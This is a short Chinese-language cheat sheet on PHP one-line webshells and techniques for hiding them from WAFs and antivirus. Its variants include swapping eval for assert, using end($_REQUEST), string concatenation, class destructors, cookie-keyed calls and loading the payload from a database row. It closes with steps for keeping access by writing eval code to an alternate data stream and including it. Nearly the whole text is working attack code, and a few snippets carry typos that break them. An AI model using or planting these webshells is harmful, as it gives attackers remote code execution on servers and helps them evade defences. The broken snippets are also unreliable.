**php一句话木马**

```php
<?php eval($_REQUEST['a']]);?>
```



**拦截进行替换**

1. 替换eval()

- assert()

2. 替换$_REQUEST['a']

- 写$_REQUEST无报错，加上 '[]' 后报错
- 利用end()绕过，end()函数的意义：输出数组中当前元素和最后一个元素的值 

```php
<?php
    eval(end($_REQUEST));
?>
```

- 当用菜刀连接时，无需密码

**通过常量的定义**

```php
<?php
    define("a", "$_REQUEST[2]");
    eval(a);
?>
```



**字符串拼接**

```php
<?php
    $a = 'ass';
    $b = 'ert';
    $c = $a.$b;
    $d = 'c';
    @$$d($_REQUEST['a']]);
?>
```



**定义函数强行分割**

```php
<?php
    function a($a){
        return $a;
    }
    eval(a($_REQUEST)['a']);
?>
```



**定义类强行分割**

```php
<?php
    class User{
        public $name = '';
        function __destruct(){
            eval("$this->name");
        }
    }
    $user = new User;
    $user -> name = "._REQUEST[1]";
?>
```



**多方式传参免杀**

```php
<?php
    $COOKIE = $_COOKIE;
    foreach($COOKIE as $key => $value){
        if($key == 'assert'){
            $key($_REQUEST[1]);
        }
    }
?>
```



**返回所有函数进行绕过**

```php
<?php
    $a = get_define_function(); // 返回所有已定义函数的数组【是一个二维数组】
    $a[internal][841]($_REQUEST[1]); // 利用internal里面的第841个值【这个值就是assert，后面加个括号代表函数】
?>
```



**绕过WAF的终极**

- 但数据库中必须有一个字段的值是eval($_REQUEST[a])

```php
<?php
    eval(mysqli_fetch_assoc(mysqli_query(mysqli_connect('127.0.0.1','root','root','database'),'select * from info'))['info']);
    // mysqli_fetch_assoc函数从结果集中取得一行作为关联数组（也就是会从结果中返回一行数据），执行连接database数据库并执行查询命令
    // 来获取info表中的第一行info字段，并通过eval执行
?>
```

**拿到WebShell后如何维持住权限**

1. 打开cmd命令行

2. 输入` echo "<?php eval($_REQUEST[1]);?>" > /:1.txt`

3. 在新建一个1.php，写` <?php include('/:1.txt');?>`包含一句话木马